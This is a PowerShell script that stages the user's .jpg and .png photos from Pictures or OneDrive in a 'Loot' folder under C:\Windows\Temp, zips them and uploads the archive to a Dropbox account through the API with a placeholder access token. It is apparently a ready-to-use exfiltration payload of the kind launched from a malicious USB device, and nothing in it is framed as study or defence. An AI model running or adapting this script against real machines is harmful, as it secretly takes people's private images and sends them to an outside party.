# Set the source path
$sourcePath = "C:\Users\$env:Username\Pictures"

# Check if C:\Users\$env:Username\Pictures does not exist, then set the source path to C:\Users\$env:Username\OneDrive\Pictures
if (-not (Test-Path $sourcePath)) {
    $sourcePath = "C:\Users\$env:Username\OneDrive\Pictures"
}

# Set the destination path to C:\Windows\Temp
$destinationPath = "C:\Windows\Temp"

# Set the base name of the destination directory
$baseDirectoryName = "Loot"

# Get the next available number for the directory
$nextDirectoryNumber = 1
do {
    $destinationDirectoryName = "$baseDirectoryName-$nextDirectoryNumber"
    $destinationDirectory = Join-Path -Path $destinationPath -ChildPath $destinationDirectoryName
    $nextDirectoryNumber++
} while (Test-Path $destinationDirectory)

# Create the destination directory
New-Item -ItemType Directory -Path $destinationDirectory | Out-Null

# Copy .jpg and .png files from the source path to the destination directory
$filesToCopy = Get-ChildItem -Path $sourcePath -Include "*.jpg", "*.png" -File -Recurse
foreach ($file in $filesToCopy) {
    $destinationFile = Join-Path -Path $destinationDirectory -ChildPath $file.Name
    Copy-Item -Path $file.FullName -Destination $destinationFile -Force
}

# Remove the existing zip file if it exists
$zipPath = Join-Path -Path $destinationPath -ChildPath "$baseDirectoryName.zip"
if (Test-Path $zipPath) {
    Remove-Item $zipPath -Force
}

# Create a .zip archive of the copied files
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($destinationDirectory, $zipPath)

# Set the Dropbox access token
$accessToken = "YOUR-ACCESS-TOKEN"

# Set the upload path in Dropbox
$dropboxUploadPath = "/"

# Create the Dropbox-API-Arg header JSON object
$apiArgJson = @{
    path = "$dropboxUploadPath/$baseDirectoryName.zip"
    mode = "add"
    autorename = $true
    mute = $false
} | ConvertTo-Json -Depth 10 -Compress

# Upload the zip file to Dropbox
$uploadUrl = "https://content.dropboxapi.com/2/files/upload"
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Dropbox-API-Arg" = $apiArgJson
}

Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -InFile $zipPath

# Display the completion message
"Zip file uploaded to Dropbox."
